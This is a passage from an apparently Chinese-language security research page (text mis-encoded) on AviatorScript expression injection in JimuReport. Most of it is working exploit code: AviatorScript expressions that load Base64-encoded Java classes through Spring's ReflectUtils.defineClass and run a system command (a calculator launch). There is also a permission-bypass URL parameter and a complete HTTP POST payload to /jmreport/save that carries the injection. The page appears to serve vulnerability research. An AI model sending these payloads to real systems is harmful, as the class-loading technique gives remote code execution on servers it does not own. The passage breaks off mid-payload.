<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use java.util.Date;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">let d = new Date();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p(type(d));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p(d);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>ä¸é€šè¿‡ <a href="https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2#azo1K" target="_blank" rel="noopener noreferrer">JavaMethodReflectionFunctionMissing</a> è°ƒç”¨ Java æ–¹æ³•ï¼ˆåŸºäºåå°„ï¼‰ä¸åŒï¼Œä½¿ç”¨ <code>use</code> åªèƒ½è°ƒç”¨ <a href="https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2#rjNeD" target="_blank" rel="noopener noreferrer">public static æ–¹æ³•</a> ï¼Œå¯¹äº spring æ¡†æ¶å¯ä»¥ç”¨ <code>org.springframework.cglib.core.ReflectUtils</code> æ¥åŠ è½½å­—èŠ‚ç ï¼Œå…³äºè¿™ä¸ªçš„åˆ©ç”¨å¯ä»¥çœ‹ä¸Šä¸€ç¯‡åˆ†æ</p>
<blockquote>
<p>Link: <a href="/docs/java/named module/">JDK 17+ FreeMarker SSTIï¼šä» CVE-2023-4450 å¤ç°å¼•å‡º MethodHandle å¥æŸ„ã€named module æœºåˆ¶ç ”ç©¶</a></p>
</blockquote>
<p><img loading="lazy" alt="image-20240807113150049" src="/assets/images/image-20240807113150049-0ec87d56cc8dec1d3a31fe5737542f17.png" width="1436" height="302" class="img_ev3q"></p>
<p>æ‰€ä»¥æœ€ç»ˆæŒ‰å…¶è¯­æ³•å¯å¾—</p>
<p>JDK 8</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass(&#x27;org.example.Exec&#x27;, Base64Utils.decodeFromString(&#x27;yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY&#x27;), ClassLoader.getSystemClassLoader());</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>JDK17 ï¼ŒAviator ä¸­ null ä¸º nil</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use org.springframework.cglib.core.*;use org.springframework.util.*;use java.security.*;ReflectUtils.defineClass(&#x27;org.springframework.expression.Test&#x27;, Base64Utils.decodeFromString(&#x27;yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY=&#x27;), ClassLoader.getSystemClassLoader(), nil, Class.forName(&#x27;org.springframework.expression.ExpressionParser&#x27;));</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jimureport-sink">Jimureport sink<a href="#jimureport-sink" class="hash-link" aria-label="Direct link to Jimureport sink" title="Direct link to Jimureport sink">â€‹</a></h2>
<p>æ¼æ´ä½äº <code>/save</code> å’Œ <code>/show</code> è¿™ä¸¤ä¸ªæ¥å£ï¼Œä¸¤ä¸ªåŒ…é—´é€šè¿‡ <code>excel_config_id</code> å…³è”</p>
<p>å‡½æ•°åæœ‰ç‚¹æŠ½è±¡å°±ä¸æ…¢æ…¢æˆªå›¾äº†ï¼Œä¸¤ä¸ªæ¥å£å¯¹åº”å‡½æ•°</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">org.jeecg.modules.jmreport.desreport.service.a.e#saveReport()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.jeecg.modules.jmreport.desreport.service.a.e#show()</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>åœ¨æ‰§è¡Œ <code>/show</code> æ—¶ï¼Œè·Ÿè¿›åˆ° <code>org.jeecg.modules.jmreport.desreport.express.a#c()</code> å‡½æ•°ï¼Œå¯¹äºä¼ å…¥çš„æ ¼å¼æœ‰è¦æ±‚ã€‚å£°æ˜äº†è§£æçš„å­—æ®µä¸º textï¼Œå¹¶ä¸”å†…å®¹å¾—é€šè¿‡ <code>=()</code> åŒ…å«</p>
<p><img loading="lazy" alt="image-20240807121741077" src="/assets/images/image-20240807121741077-6bdc30e0280ede863ae254667fd109d4.png" width="1876" height="1058" class="img_ev3q"></p>
<p>è‡³äº <code>/jeecg-boot/jmreport/save?previousPage=xxx&amp;jmLink=YWFhfHxiYmI=</code> åˆ™æ˜¯ç”¨äº jeeboot çš„æƒé™ç»•è¿‡</p>
<p>payload:</p>
<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-http codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token request-line method property" style="color:#36acaa">POST</span><span class="token request-line"> </span><span class="token request-line request-target url" style="color:#36acaa">/jmreport/save</span><span class="token request-line"> </span><span class="token request-line http-version property" style="color:#36acaa">HTTP/1.1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token header header-name keyword" style="color:#00009f">Host</span><span class="token header punctuation" style="color:#393A34">:</span><span class="token header"> </span><span class="token header header-value">localhost:8085</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token header header-name keyword" style="color:#00009f">User-Agent</span><span class="token header punctuation" style="color:#393A34">:</span><span class="token header"> </span><span class="token header header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token header header-name keyword" style="color:#00009f">Accept</span><span class="token header punctuation" style="color:#393A34">:</span><span class="token header"> </span><span class="token header header-value">application/json, text/plain, */*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token header header-name keyword" style="color:#00009f">Content-Type</span><span class="token header punctuation" style="color:#393A34">:</span><span class="token header"> </span><span class="token header header-value">application/json</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json"></span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;loopBlockList&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">[</span><span class="token application-json punctuation" style="color:#393A34">]</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;area&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json boolean" style="color:#36acaa">false</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;printElWidth&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">718</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;excel_config_id&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json string" style="color:#e3116c">&quot;53c82a76f837d5661dceec7d93afep&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;printElHeight&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">1047</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;rows&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json property" style="color:#36acaa">&quot;4&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">            </span><span class="token application-json property" style="color:#36acaa">&quot;cells&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">                </span><span class="token application-json property" style="color:#36acaa">&quot;4&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">                    </span><span class="token application-json property" style="color:#36acaa">&quot;text&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json string" style="color:#e3116c">&quot;=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass(&#x27;com.ppp.Exec&#x27;, Base64Utils.decodeFromString(&#x27;yv66vgAAADQANAoADAAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQIACUIACYHACcHACgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADkxjb20vcHBwL0V4ZWM7AQANU3RhY2tNYXBUYWJsZQcAJwcAJAEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEACUV4ZWMuamF2YQwADQAOBwApDAAqACsBAARFeGVjBwAsDAAtAC4HAC8MADAAMQEABGNhbGMMADIAMwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAtzdGF0aWMgRXhlYwEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHABAAxjb20vcHBwL0V4ZWMBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAsADAAAAAAAAgABAA0ADgABAA8AAAB2AAIAAgAAABoqtwABsgACEgO2AAS4AAUSBrYAB1enAARMsQABAAQAFQAYAAgAAwAQAAAAGgAGAAAABwAEAAkADAAKABUADAAYAAsAGQANABEAAAAMAAEAAAAaABIAEwAAABQAAAAQAAL/ABgAAQcAFQABBwAWAAAIABcADgABAA8AAABbAAIAAQAAABayAAISCbYABLgABRIKtgAHV6cABEuxAAEAAAARABQACAADABAAAAAWAAUAAAARAAgAEgARABQAFAATABUAFQARAAAAAgAAABQAAAAHAAJUBwAWAAABABgAAAACABk=&#x27;), ClassLoader.getSystemClassLoader());)&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">                    </span><span class="token application-json property" style="color:#36acaa">&quot;style&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">0</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">                </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">            </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">            </span><span class="token application-json property" style="color:#36acaa">&quot;height&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">25</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json property" style="color:#36acaa">&quot;len&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">96</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json property" style="color:#36acaa">&quot;-1&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">            </span><span class="token application-json property" style="color:#36acaa">&quot;cells&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">                </span><span class="token application-json property" style="color:#36acaa">&quot;-1&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">                    </span><span class="token application-json property" style="color:#36acaa">&quot;text&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json string" style="color:#e3116c">&quot;${gongsi.id}&quot;</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">                </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">            </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">            </span><span class="token application-json property" style="color:#36acaa">&quot;isDrag&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json boolean" style="color:#36acaa">true</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;dbexps&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">[</span><span class="token application-json punctuation" style="color:#393A34">]</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;toolPrintSizeObj&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json property" style="color:#36acaa">&quot;printType&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json string" style="color:#e3116c">&quot;A4&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json property" style="color:#36acaa">&quot;widthPx&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">718</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json property" style="color:#36acaa">&quot;heightPx&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">1047</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;dicts&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">[</span><span class="token application-json punctuation" style="color:#393A34">]</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;freeze&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json string" style="color:#e3116c">&quot;A1&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;dataRectWidth&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">701</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;background&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json boolean" style="color:#36acaa">false</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;name&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json string" style="color:#e3116c">&quot;sheet1&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;autofilter&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;styles&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">[</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">            </span><span class="token application-json property" style="color:#36acaa">&quot;align&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json string" style="color:#e3116c">&quot;center&quot;</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json punctuation" style="color:#393A34">]</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;validations&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">[</span><span class="token application-json punctuation" style="color:#393A34">]</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;cols&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json property" style="color:#36acaa">&quot;4&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">            </span><span class="token application-json property" style="color:#36acaa">&quot;width&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">95</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json property" style="color:#36acaa">&quot;len&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json number" style="color:#36acaa">50</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;merges&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json punctuation" style="color:#393A34">[</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json string" style="color:#e3116c">&quot;E4:F4&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token 